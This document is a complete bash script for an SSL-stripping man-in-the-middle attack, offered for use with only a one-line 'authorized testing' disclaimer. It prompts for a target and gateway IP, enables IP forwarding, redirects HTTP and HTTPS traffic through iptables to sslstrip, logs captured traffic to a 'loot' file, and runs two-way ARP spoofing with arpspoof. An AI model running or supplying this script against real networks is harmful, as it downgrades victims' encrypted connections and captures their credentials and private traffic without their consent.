#!/bin/bash
# SSL Strip MITM - Downgrade HTTPS to HTTP
# Author: David Osisek  
# FOR AUTHORIZED TESTING ONLY
# HIGH DETECTABILITY

echo "[!] SSL Strip MITM Attack"
echo "[*] Enter target IP:"
read TARGET_IP
echo "[*] Enter gateway IP:"
read GATEWAY_IP

# Enable forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# Redirect HTTP/HTTPS
iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 10000
iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-port 10000

# Start sslstrip
echo "[+] Starting sslstrip..."
sslstrip -l 10000 -w /root/loot/sslstrip.log &

# ARP spoof
echo "[+] Starting ARP spoofing..."
arpspoof -i eth0 -t $TARGET_IP $GATEWAY_IP &
arpspoof -i eth0 -t $GATEWAY_IP $TARGET_IP &

echo "[+] MITM Active - Press Ctrl+C to stop"
wait
